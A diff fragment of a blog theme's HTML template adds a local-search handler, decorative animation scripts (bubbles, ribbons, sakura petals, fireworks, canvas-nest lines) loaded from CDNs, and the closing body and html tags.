+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/qipao.js"></script>
+<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/caidai.js"></script>
+<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/yinghua.js"></script>
+<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/boom.js"></script>
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+<!--//背景线条      {% if theme.canvas_nest %}-->
+<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+{% endif %}
+
+<!-- fireworks-->
+<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+<script type="text/javascript" src="/js/fireworks.js"></script>
+
+</body>
+</html>
